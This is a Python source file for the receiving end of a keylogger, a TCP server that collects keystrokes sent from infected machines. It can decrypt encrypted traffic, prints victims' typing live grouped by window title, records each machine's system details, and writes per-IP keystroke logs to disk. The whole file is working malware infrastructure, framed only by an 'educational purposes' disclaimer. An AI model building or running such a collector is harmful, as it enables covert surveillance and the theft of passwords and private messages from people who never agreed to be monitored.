"""
Listener Server for Educational Keylogger
==========================================
Receives and displays log data from keylogger over network.

WARNING: This is for EDUCATIONAL PURPOSES ONLY.
"""

import socket
import json
import threading
import os
from datetime import datetime
from cryptography.fernet import Fernet


class KeyloggerListener:
    """
    Server that listens for keylogger data over the network.
    """

    def __init__(self, host='0.0.0.0', port=9999, save_logs=True,
                 output_dir='received_logs', use_encryption=False, encryption_key=None):
        """
        Initialize the listener server.

        Args:
            host: Host address to bind to (0.0.0.0 for all interfaces)
            port: Port to listen on
            save_logs: Whether to save received logs to disk
            output_dir: Directory to save received logs
            use_encryption: Whether data is encrypted
            encryption_key: Decryption key if encryption is used
        """
        self.host = host
        self.port = port
        self.save_logs = save_logs
        self.output_dir = output_dir
        self.use_encryption = use_encryption
        self.cipher = None
        self.running = False
        self.sessions = {}

        # Track window history and text buffers per client (simplified - append only)
        self.client_windows = {}  # {client_ip: current_window}
        self.window_buffers = {}  # {client_ip: {window: text_buffer}}


        if use_encryption and encryption_key:
            self.cipher = Fernet(encryption_key.encode() if isinstance(encryption_key, str) else encryption_key)

        if save_logs and not os.path.exists(output_dir):
            os.makedirs(output_dir)

    def start(self):
        """Start the listener server."""
        self.running = True

        print("="*80)
        print("KEYLOGGER LISTENER SERVER - PHASE 4C")
        print("="*80)
        print(f"Listening on: {self.host}:{self.port}")
        print(f"Encryption: {'Enabled' if self.use_encryption else 'Disabled'}")
        print(f"Save logs: {'Yes' if self.save_logs else 'No'}")
        if self.save_logs:
            print(f"Output directory: {self.output_dir}")
        print("="*80)
        print("\nWaiting for connections... (Press Ctrl+C to stop)\n")

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
                server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server_socket.bind((self.host, self.port))
                server_socket.listen(5)

                while self.running:
                    try:
                        server_socket.settimeout(1.0)
                        client_socket, client_address = server_socket.accept()

                        client_thread = threading.Thread(
                            target=self._handle_client,
                            args=(client_socket, client_address),
                            daemon=True
                        )
                        client_thread.start()
                    except socket.timeout:
                        continue
                    except Exception as e:
                        if self.running:
                            print(f"[ERROR] Accept failed: {e}")

        except KeyboardInterrupt:
            print("\n\n[INFO] Shutting down listener...")
        except Exception as e:
            print(f"[ERROR] Server error: {e}")
        finally:
            self.running = False
            print("[INFO] Listener stopped.")

    def _handle_client(self, client_socket, client_address):
        """Handle a client connection."""
        print(f"\n[CONNECTION] New connection from {client_address[0]}:{client_address[1]}")

        try:
            with client_socket:
                # Keep connection open and receive multiple messages
                while True:
                    # Receive message size (4 bytes)
                    size_data = client_socket.recv(4)
                    if not size_data:
                        break  # Connection closed

                    data_size = int.from_bytes(size_data, byteorder='big')

                    # Receive the actual data
                    data = b''
                    while len(data) < data_size:
                        chunk = client_socket.recv(min(4096, data_size - len(data)))
                        if not chunk:
                            break
                        data += chunk

                    if len(data) < data_size:
                        break  # Incomplete data, connection lost

                    # Decrypt if needed
                    if self.use_encryption and self.cipher:
                        try:
                            data = self.cipher.decrypt(data)
                        except Exception:
                            client_socket.sendall(b'ERROR')
                            continue

                    # Parse and process message
                    message = json.loads(data.decode('utf-8'))
                    self._process_message(message, client_address)

                    # Send acknowledgment
                    client_socket.sendall(b'OK')

                    # Check if this is a disconnect message
                    if message.get('type') == 'disconnect':
                        break

        except Exception as e:
            print(f"[ERROR] Client handler error: {e}")
        finally:
            print(f"[CONNECTION] Connection closed from {client_address[0]}:{client_address[1]}")

    def _process_message(self, message, client_address):
        """Process received message based on type."""
        msg_type = message.get('type', 'unknown')
        timestamp = message.get('timestamp', 'N/A')
        client_ip = client_address[0]

        if msg_type == 'connection_test':
            print(f"[TEST] Connection test from {client_ip}")

        elif msg_type == 'keystroke':
            keystroke = message.get('data', {})
            key = keystroke.get('key', '?')
            window = keystroke.get('window', 'Unknown')
            modifiers = keystroke.get('modifiers', [])

            # Initialize client tracking if needed
            if client_ip not in self.client_windows:
                self.client_windows[client_ip] = None
                self.window_buffers[client_ip] = {}


            # Check if window changed
            if self.client_windows[client_ip] != window:
                # Display window separator

                print(f"\n\n{'='*28}||  {window}  ||{'='*28}\n")


                # Update current window
                self.client_windows[client_ip] = window

                # Initialize buffer for this window if needed
                if window not in self.window_buffers[client_ip]:
                    self.window_buffers[client_ip][window] = ""

            # Get current buffer (simplified append-only mode)
            buffer = self.window_buffers[client_ip][window]

            # Process the keystroke - SIMPLIFIED VERSION

            key_display = ''
            buffer_modified = False

            if key.startswith('Key.'):
                # Special key handling
                key_name = key.replace('Key.', '').upper()

                if key_name == 'SPACE':
                    buffer += ' '

                    key_display = ' '
                    buffer_modified = True

                elif key_name == 'ENTER':

                    buffer += '\n'

                    print()
                    buffer_modified = True

                elif key_name == 'BACKSPACE':

                    # Just display the action
                    key_display = ' [⌫] '

                elif key_name == 'DELETE':
                    key_display = ' [DEL] '

                elif key_name == 'LEFT':
                    key_display = ' ← '

                elif key_name == 'RIGHT':
                    key_display = ' → '

                elif key_name == 'UP':
                    key_display = ' ↑ '

                elif key_name == 'DOWN':
                    key_display = ' ↓ '

                elif key_name == 'HOME':
                    key_display = ' [HOME] '

                elif key_name == 'END':
                    key_display = ' [END] '

                elif key_name == 'TAB':
                    buffer += '\t'

                    key_display = '[TAB]'
                    buffer_modified = True

                else:
                    # Other special keys (just display)
                    key_display = f'[{key_name}]'
            else:

                # Regular character - add to buffer
                buffer += key
                key_display = key
                buffer_modified = True

            # Update buffer if modified
            if buffer_modified:
                self.window_buffers[client_ip][window] = buffer

            # Display the character/action
            if key_display:
                print(key_display, end='', flush=True)


            if self.save_logs:
                self._save_keystroke(keystroke, timestamp, client_address)

        elif msg_type == 'text_data':
            data_text = message.get('data', '')
            print(f"\n[TEXT_DATA] [{timestamp}] from {client_ip}")
            print(f"          {data_text}")

        elif msg_type == 'batch':
            count = message.get('count', 0)
            entries = message.get('data', [])

            print(f"\n[BATCH] [{timestamp}] Received {count} log entries from {client_ip}")

            if self.save_logs:
                self._save_batch(entries, timestamp, client_address)

        elif msg_type == 'session_info':
            session_data = message.get('data', {})
            session_id = session_data.get('session_id', 'unknown')

            self.sessions[session_id] = session_data

            print(f"\n{'='*80}")
            print(f"[SESSION] New session from {client_ip}")
            print(f"{'='*80}")
            print(f"  Session ID: {session_id}")
            print(f"  Start Time: {session_data.get('start_time', 'Unknown')}")
            print(f"  System: {session_data.get('system', 'Unknown')}")
            print(f"  Machine: {session_data.get('machine', 'Unknown')}")
            print(f"  Release: {session_data.get('release', 'Unknown')}")
            print(f"{'='*80}")
            print(f"\n[LIVE KEYSTROKES from {client_ip}]")
            print("-" * 80)

            # Initialize tracking for this client
            self.client_windows[client_ip] = None
            self.window_buffers[client_ip] = {}



        elif msg_type == 'disconnect':
            session_data = message.get('data', {})
            session_id = session_data.get('session_id', 'unknown')
            print(f"\n\n{'='*80}")
            print(f"[DISCONNECT] Session ended: {session_id} from {client_ip}")
            print(f"{'='*80}\n")

            # Clean up tracking for this client
            if client_ip in self.client_windows:
                del self.client_windows[client_ip]
            if client_ip in self.window_buffers:
                del self.window_buffers[client_ip]


        elif msg_type == 'file':
            print(f"\n[FILE] File transmission from {client_ip} (not fully implemented in this handler)")

        else:
            print(f"\n[UNKNOWN] Unknown message type: {msg_type} from {client_ip}")

    def _save_keystroke(self, keystroke, timestamp, client_address):
        """Save a keystroke to a log file."""
        try:
            filename = f"keystroke_log_{client_address[0]}.txt"
            filepath = os.path.join(self.output_dir, filename)

            with open(filepath, 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] {keystroke}\n")
        except Exception:
            pass

    def _save_batch(self, entries, timestamp, client_address):
        """Save a batch of entries to a log file."""
        try:
            filename = f"batch_log_{client_address[0]}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            filepath = os.path.join(self.output_dir, filename)

            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(f"Batch received at: {timestamp}\n")
                f.write(f"Number of entries: {len(entries)}\n")
                f.write("="*80 + "\n\n")

                for entry in entries:
                    f.write(f"{entry}\n")

            print(f"          Saved to: {filename}")
        except Exception as e:
            print(f"          [ERROR] Failed to save batch: {e}")

    def stop(self):
        """Stop the listener server."""
        self.running = False


def main():
    """Main function to run the listener server."""
    import argparse

    parser = argparse.ArgumentParser(
        description='Keylogger Listener Server - Receives log data over network',
        epilog='Educational purposes only'
    )

    parser.add_argument(
        '-H', '--host',
        type=str,
        default='0.0.0.0',
        help='Host address to bind to (default: 0.0.0.0 - all interfaces)'
    )

    parser.add_argument(
        '-p', '--port',
        type=int,
        default=9999,
        help='Port to listen on (default: 9999)'
    )

    parser.add_argument(
        '-o', '--output',
        type=str,
        default='received_logs',
        help='Output directory for received logs (default: received_logs)'
    )

    parser.add_argument(
        '--no-save',
        action='store_true',
        help='Do not save logs to disk (display only)'
    )

    parser.add_argument(
        '-e', '--encrypt',
        action='store_true',
        help='Expect encrypted data'
    )

    parser.add_argument(
        '-k', '--key',
        type=str,
        help='Encryption key (required if --encrypt is used)'
    )

    args = parser.parse_args()

    if args.encrypt and not args.key:
        print("[ERROR] Encryption key is required when --encrypt is used")
        return

    listener = KeyloggerListener(
        host=args.host,
        port=args.port,
        save_logs=not args.no_save,
        output_dir=args.output,
        use_encryption=args.encrypt,
        encryption_key=args.key
    )

    listener.start()


if __name__ == "__main__":
    main()
